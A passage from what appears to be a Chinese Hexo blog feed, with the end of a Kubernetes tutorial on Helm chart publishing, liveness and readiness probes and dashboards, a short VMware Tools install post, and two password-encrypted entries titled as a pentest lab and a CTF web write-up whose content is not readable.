class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configure</span> <span class="hljs-string">Git</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          git config user.name &quot;$GITHUB_ACTOR&quot;</span><br><span class="hljs-string">          git config user.email &quot;$GITHUB_ACTOR@users.noreply.github.com&quot;</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Helm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">azure/setup-helm@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">version:</span> <span class="hljs-string">v3.8.1</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">chart-releaser</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">helm/chart-releaser-action@v1.4.0</span><br>        <span class="hljs-attr">with:</span> <br>          <span class="hljs-attr">charts_dir:</span> <span class="hljs-string">helm-charts</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">CR_TOKEN:</span> <span class="hljs-string">&quot;$<span class="hljs-template-variable">&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>接着配置仓库的 <code>Settings -&gt; Pages -&gt; Build and deployment -&gt; Branch</code>，选择 <code>gh-pages</code> 分支，GitHub 会自动在 <code>https://username.github.io/project</code> 发布 helm chart。</p><h1 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h1><h2 id="存活探针-livenessProb"><a href="#存活探针-livenessProb" class="headerlink" title="存活探针 (livenessProb)"></a>存活探针 (livenessProb)</h2><blockquote><p>存活探测器来确定什么时候要重启容器。 例如，存活探测器可以探测到应用死锁（应用程序在运行，但是无法继续执行后面的步骤）情况。 重启这种状态下的容器有助于提高应用的可用性，即使其中存在缺陷。– <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">LivenessProb</a></p></blockquote><p>在生产中，有时候因为某些 bug 导致应用死锁或者线程耗尽了，最终会导致应用无法继续提供服务，这个时候如果没有手段来自动监控和处理这一问题的话，可能会导致很长一段时间无人发现。<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/">kubelet</a> 使用存活探测器 (livenessProb) 来确定什么时候要重启容器。</p><p>接下来我们写一个 <code>/healthz</code> 接口来说明 <code>livenessProb</code> 如何使用。 <code>/healthz</code> 接口会在启动成功的 15s 内正常返回 200 状态码，在 15s 后，会一直返回 500 的状态码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>started := time.Now()<br>http.HandleFunc(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>duration := time.Since(started)<br><span class="hljs-keyword">if</span> duration.Seconds() &gt; <span class="hljs-number">15</span> &#123;<br>w.WriteHeader(<span class="hljs-number">500</span>)<br>w.Write([]<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error: %v&quot;</span>, duration.Seconds())))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>w.WriteHeader(<span class="hljs-number">200</span>)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;ok&quot;</span>))<br>&#125;<br>&#125;)<br><br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>编写对应的 <code>Dockerfile</code> 文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dockerfile</span><br><span class="hljs-string">FROM</span> <span class="hljs-string">golang:1.16-buster</span> <span class="hljs-string">AS</span> <span class="hljs-string">builder</span><br><span class="hljs-string">RUN</span> <span class="hljs-string">mkdir</span> <span class="hljs-string">/src</span><br><span class="hljs-string">ADD</span> <span class="hljs-string">.</span> <span class="hljs-string">/src</span><br><span class="hljs-string">WORKDIR</span> <span class="hljs-string">/src</span><br><br><span class="hljs-string">RUN</span> <span class="hljs-string">go</span> <span class="hljs-string">env</span> <span class="hljs-string">-w</span> <span class="hljs-string">GO111MODULE=auto</span><br><span class="hljs-string">RUN</span> <span class="hljs-string">go</span> <span class="hljs-string">build</span> <span class="hljs-string">-o</span> <span class="hljs-string">main</span> <span class="hljs-string">.</span><br><br><span class="hljs-string">FROM</span> <span class="hljs-string">gcr.io/distroless/base-debian10</span><br><br><span class="hljs-string">WORKDIR</span> <span class="hljs-string">/</span><br><br><span class="hljs-string">COPY</span> <span class="hljs-string">--from=builder</span> <span class="hljs-string">/src/main</span> <span class="hljs-string">/main</span><br><span class="hljs-string">EXPOSE</span> <span class="hljs-number">3000</span><br><span class="hljs-string">ENTRYPOINT</span> [<span class="hljs-string">&quot;/main&quot;</span>]<br></code></pre></td></tr></table></figure><p><code>Dockerfile</code> 的编写和原来保持一致，我们把 <code>tag</code> 修改为 <code>liveness</code> 并推送到远程仓库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:liveness<br>docker push guangzhengli/hellok8s:liveness<br></code></pre></td></tr></table></figure><p>最后编写 deployment 的定义，这里使用存活探测方式是使用 HTTP GET 请求，请求的是刚才定义的 <code>/healthz</code> 接口，<code>periodSeconds</code> 字段指定了 kubelet 每隔 3 秒执行一次存活探测。 <code>initialDelaySeconds</code> 字段告诉 kubelet 在执行第一次探测前应该等待 3 秒。如果服务器上 <code>/healthz</code> 路径下的处理程序返回成功代码，则 kubelet 认为容器是健康存活的。 如果处理程序返回失败代码，则 kubelet 会杀死这个容器并将其重启。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">strategy:</span><br>     <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:liveness</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">livenessProbe:</span><br>            <span class="hljs-attr">httpGet:</span><br>              <span class="hljs-attr">path:</span> <span class="hljs-string">/healthz</span><br>              <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>            <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">3</span><br>            <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>通过 <code>get</code> 或者 <code>describe</code> 命令可以发现 pod 一直处于重启当中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml<br><br>kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS     AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-d5fbz   1/1     Running   4 (6s ago)   102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-gz2cx   1/1     Running   4 (5s ago)   101s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5995ff9447-rh29x   1/1     Running   4 (6s ago)   102s</span><br><br>kubectl describe pod hellok8s-68f47f657c-zwn6g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Events:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Type     Reason     Age                   From               Message</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> ----     ------     ----                  ----               -------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Scheduled  12m                   default-scheduler  Successfully assigned default/hellok8s-deployment-5995ff9447-rh29x to minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Pulled     11m (x4 over 12m)     kubelet            Container image <span class="hljs-string">&quot;guangzhengli/hellok8s:liveness&quot;</span> already present on machine</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Created    11m (x4 over 12m)     kubelet            Created container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Started    11m (x4 over 12m)     kubelet            Started container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Normal   Killing    11m (x3 over 12m)     kubelet            Container hellok8s-container failed liveness probe, will be restarted</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Warning  Unhealthy  11m (x10 over 12m)    kubelet            Liveness probe failed: HTTP probe failed with statuscode: 500</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"> Warning  BackOff    2m41s (x36 over 10m)  kubelet            Back-off restarting failed container</span><br></code></pre></td></tr></table></figure><h2 id="就绪探针-readiness"><a href="#就绪探针-readiness" class="headerlink" title="就绪探针 (readiness)"></a>就绪探针 (readiness)</h2><blockquote><p>就绪探测器可以知道容器何时准备好接受请求流量，当一个 Pod 内的所有容器都就绪时，才能认为该 Pod 就绪。 这种信号的一个用途就是控制哪个 Pod 作为 Service 的后端。 若 Pod 尚未就绪，会被从 Service 的负载均衡器中剔除。– <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">ReadinessProb</a></p></blockquote><p>在生产环境中，升级服务的版本是日常的需求，这时我们需要考虑一种场景，即当发布的版本存在问题，就不应该让它升级成功。kubelet 使用就绪探测器可以知道容器何时准备好接受请求流量，当一个 pod 升级后不能就绪，即不应该让流量进入该 pod，在配合 <code>rollingUpate</code> 的功能下，也不能允许升级版本继续下去，否则服务会出现全部升级完成，导致所有服务均不可用的情况。</p><p>这里我们把服务回滚到 <code>hellok8s:v2</code> 的版本，可以通过上面学习的方法进行回滚。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl rollout undo deployment hellok8s-deployment --to-revision=2<br></code></pre></td></tr></table></figure><p>这里我们将应用的 <code>/healthz</code> 接口直接设置成返回 500 状态码，代表该版本是一个有问题的版本。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>w.WriteHeader(<span class="hljs-number">500</span>)<br>&#125;)<br><br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>build</code> 阶段我们将 <code>tag</code> 设置为 <code>bad</code>，打包后 push 到远程仓库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:bad<br><br>docker push guangzhengli/hellok8s:bad<br></code></pre></td></tr></table></figure><p>接着编写 deployment 资源文件，<a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#probe-v1-core">Probe</a> 有很多配置字段，可以使用这些字段精确地控制就绪检测的行为：</p><ul><li><code>initialDelaySeconds</code>：容器启动后要等待多少秒后才启动存活和就绪探测器， 默认是 0 秒，最小值是 0。</li><li><code>periodSeconds</code>：执行探测的时间间隔（单位是秒）。默认是 10 秒。最小值是 1。</li><li><code>timeoutSeconds</code>：探测的超时后等待多少秒。默认值是 1 秒。最小值是 1。</li><li><code>successThreshold</code>：探测器在失败后，被视为成功的最小连续成功数。默认值是 1。 存活和启动探测的这个值必须是 1。最小值是 1。</li><li><code>failureThreshold</code>：当探测失败时，Kubernetes 的重试次数。 对存活探测而言，放弃就意味着重新启动容器。 对就绪探测而言，放弃意味着 Pod 会被打上未就绪的标签。默认值是 3。最小值是 1。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">strategy:</span><br>     <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:bad</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">readinessProbe:</span><br>            <span class="hljs-attr">httpGet:</span><br>              <span class="hljs-attr">path:</span> <span class="hljs-string">/healthz</span><br>              <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>            <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">1</span><br>            <span class="hljs-attr">successThreshold:</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>通过 <code>get</code> 命令可以发现两个 pod 一直处于还没有 Ready 的状态当中，通过 <code>describe</code> 命令可以看到是因为 <code>Readiness probe failed: HTTP probe failed with statuscode: 500</code> 的原因。又因为设置了最小不可用的服务数量为<code>maxUnavailable=1</code>，这样能保证剩下两个 <code>v2</code> 版本的 <code>hellok8s</code> 能继续提供服务！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml<br><br>kubectl get pods                <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-66799848c4-8xzsz   1/1     Running   0          102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-66799848c4-m9dl5   1/1     Running   0          102s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-9c57c7f56-rww7k    0/1     Running   0          26s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-9c57c7f56-xt9tw    0/1     Running   0          26s</span><br><br><br>kubectl describe pod hellok8s-deployment-9c57c7f56-rww7k<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Events:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Type     Reason     Age                From               Message</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  ----     ------     ----               ----               -------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Scheduled  74s                default-scheduler  Successfully assigned default/hellok8s-deployment-9c57c7f56-rww7k to minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Pulled     73s                kubelet            Container image <span class="hljs-string">&quot;guangzhengli/hellok8s:bad&quot;</span> already present on machine</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Created    73s                kubelet            Created container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Normal   Started    73s                kubelet            Started container hellok8s-container</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">  Warning  Unhealthy  0s (x10 over 72s)  kubelet            Readiness probe failed: HTTP probe fa</span><br></code></pre></td></tr></table></figure><h1 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h1><p>2025年4月11日 · 251 字</p><h2 id="kubernetes-dashboard"><a href="#kubernetes-dashboard" class="headerlink" title="kubernetes dashboard"></a>kubernetes dashboard</h2><blockquote><p>Dashboard 是基于网页的 Kubernetes 用户界面。 你可以使用 Dashboard 将容器应用部署到 Kubernetes 集群中，也可以对容器应用排错，还能管理集群资源。 你可以使用 Dashboard 获取运行在集群中的应用的概览信息，也可以创建或者修改 Kubernetes 资源 （如 Deployment，Job，DaemonSet 等等）。 例如，你可以对 Deployment 实现弹性伸缩、发起滚动升级、重启 Pod 或者使用向导创建新的应用。</p></blockquote><p>在本地 minikube 环境，可以直接通过下面命令开启 Dashboard。更多用法可以参考官网或者自行探索。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube dashboard<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guangzhengli/PicURL@master/uPic/eB3MYd.png" alt="eB3MYd"></p><h2 id="K9s"><a href="#K9s" class="headerlink" title="K9s"></a>K9s</h2><p><a href="https://k9scli.io/">K9s</a> 是一个基于 Terminal 的轻量级 UI，可以更加轻松的观察和管理已部署的 k8s 资源。使用方式非常简单，安装后输入 <code>k9s</code> 即可开启 Terminal Dashboard，更多用法可以参考官网。</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/83ybd4.png" alt="83ybd4"></p><p>refer</p><ul><li><a href="https://minikube.sigs.k8s.io/docs/">minikube</a></li><li><a href="https://guangzhengli.com/courses">k8s教程</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmtools安装</title>
    <link href="/2025/04/26/vmtools%E5%AE%89%E8%A3%85/"/>
    <url>/2025/04/26/vmtools%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="在Ubuntu上安装VMware-Tools"><a href="#在Ubuntu上安装VMware-Tools" class="headerlink" title="在Ubuntu上安装VMware Tools"></a>在Ubuntu上安装VMware Tools</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br><br>sudo reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vmtools安装</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Hospital</title>
    <link href="/2025/04/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/"/>
    <url>/2025/04/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8fa2e1389a165b08492ae7d4430e814569dc8e671ef465d23ec25db48749c52"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网渗透</tag>
      
      <tag>春秋云镜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF-web方向剖析</title>
    <link href="/2025/04/15/TGCTF-web%E6%96%B9%E5%90%91%E5%89%96%E6%9E%90/"/>
    <url>/2025/04/15/TGCTF-web%E6%96%B9%E5%90%91%E5%89%96%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fa382b56a42c6728c3f252ebc6f45085fc5399f48be6b786229a713e72278383">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0d36ea96aad2a673b8b813abc6b7babd64581aa0081dc619054808beaead8b4d5004dc60e042e0c3c843e178cc87a411e705aea242127975f7fc611a61d45580a508bc5b7e2699136733a88d685184ee16843fc3f7ba31b524fdfc6e075188c0915f1a635d764f7b596f78a90e7c11571319f125bc6b49ad3660fc3902707f5bf736b1ab20918e59e0c3a88a3481cfcb7e98ce6752fd04e666ecac27313368ff5b3bdd931daecdabf0829368bd7d2b1d428eae64f98e55390f99e760df52e434f06023bb163c8cbb861fe15af19d148e4d903e67c11297fda819a7457e5ee3b7d64b4868cbe75536a9a9a4c0fe006cf8cb76fb1c63d8c4c3fef382cfcdb63041eec314bc658c88a652bd0e1664f4cba86a51d6429de0d0ac92252c8db0d3509807dd22257ea25897b6f6e4cdac4e48150ffd8a7e0fdfacc33269f0c2c85ffd29c71675759d9093e36fa338ca69693bdd4c6d2d183c01781bc4696ec3f86b30d1b59f0339b6599642c66ce0b0aad00fded486abb428221fb0c89587523a12c081265c74a5405bd58f8285498abd73f7836f62644cf16391dc4ad78f528ffb2d4bd2d20e7bc1aa74db0547ece7ec6f81e3722d63acb5f0ebbb09b95a58ab8906d47bf51a43b84494e7e06dab63e7d2bd31988eed14d7576be7c61df747b5dd6395a9803884ae4b8e6adaa061dd56781b00947c475d53d99149f1e6e361491e087ce599ff7daf25be23e7c8b24a779877b1b61aa0f87a5d9fb05aaab1e436314febc56b983b28a968ad3641511a8f2541d62a05b9fbab4290d2801a38763abdeff699d39d785c69247f50fd593e377d264172039ba3c5146560d4f78b06edaa131cfdf30468772cc88d3027dc8c111a178718e8aca1188f853b20b0f6a4d0c3a6dd2dcad27e9034fe00b7496d78f4afb02010cbf63c7aef6a84fa4d0d7960f34fac76490a665cfbad99c5192551c0e5e1c6d1937a2457c767db4f0b3ee6af00f8a3dce1a9ee749140a48c9a0be46746282bdffaf3b7836f0c3a904f78385620e93975dfe654bc0faec8eb89cbebe8ab710fa2e1bd025c8701f3d4c1825cc3a917ebf6cc820b519955eb5ba02d44911dcf2af6e7cecf38c7452d6dd35a9bbe497904846a86915f39048bec10f5639183684107e173199886cec91ca29776bb5ec4a8a9875f122939d385ea2508501848801f78ee7327684e18d9c90101a2e0501383d69fc85094c34992ae072263c29e2a4de4d9f71a8fb004fefa3c8e151f805439548f7a00018a78798978606786222dcd1c9be047fc7f044f22e8ecd025073b8666c02ad0e1532d63009ff29b620e891b4c78e7376cfc59a0b3facb3303aa0efe42dacc32a235726f8cbd8d2cf58b4522e83f31c4e5821835d2ae998e666baa49f6c43dec